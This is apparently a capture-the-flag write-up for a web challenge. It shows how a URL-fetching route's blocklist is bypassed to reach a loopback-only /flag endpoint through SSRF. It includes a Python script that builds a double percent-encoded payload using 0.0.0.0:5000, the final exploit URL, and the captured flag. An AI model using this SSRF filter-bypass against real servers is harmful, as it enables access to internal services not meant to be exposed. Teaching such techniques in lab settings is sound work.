# Simple Servers Real Fun

> Points: 200

> Category: Web

## Description

Check out my new Redirect as a Service website!

## Attachments

https://simple-servers-real-fun.robinjadoul.repl.co/

## Solution

The first thing that caught my eye is the **/flag** route, because that is the route that will output the flag.

```py
if ipaddress.ip_address(flask.request.remote_addr).is_loopback:
	return open("flag.txt").read()
```

It seems as if the only way to return the flag is if the web server requests the page itself (because it only reads the file if the ip is a [loopback address](https://www.techopedia.com/definition/2440/loopback-address-ip-address)).

The **/hit_it** route appears to make requests to the server, so that is what we are going to have to use to get the flag.


```py
def hit_it():
    target = flask.request.args.get("it")
    if not target:
        return "Aww?"
    if any(x in target for x in ["127", "local", "flag"]):
        return "Nah, bruv"
    return requests.get(target).text
```

```py
if __name__ == "__main__":
    app.run("0.0.0.0", 5000)
```

From the code above, we know what local IP and port the server is running on. We just need to find a way to the **/flag** route. So far our GET request looks like this

``https://simple-servers-real-fun.robinjadoul.repl.co/?it=http://0.0.0.0:5000/``

1. Convert each character in the string **flag** (the route name) to it's corresponding hex value and prepend a percent sign to it. (Ex. f -> %66)

2. Keep on appending these percent encoded hex values to the localserver URL

3. URL encode the final string


```py
# Python3

import urllib.parse

hexURLencString = "http://0.0.0.0:5000/"
for i in "flag":
    hexURLencString += "%" + str(hex(ord(i))[2:])
# hexURLencString is equal to http://0.0.0.0:5000/%66%6c%61%67

# URL encode
print(urllib.parse.quote_plus(hexURLencString))

# OUTPUT: http%3A%2F%2F0.0.0.0%3A5000%2F%2566%256c%2561%2567
```

Pass the encoded URL we just generated as the **it** arg.

``https://simple-servers-real-fun.robinjadoul.repl.co/hit_it?it=http%3A%2F%2F0.0.0.0%3A5000%2F%2566%256C%2561%2567``


### Flag
> ictf{mind_the_ssrf_bypass}
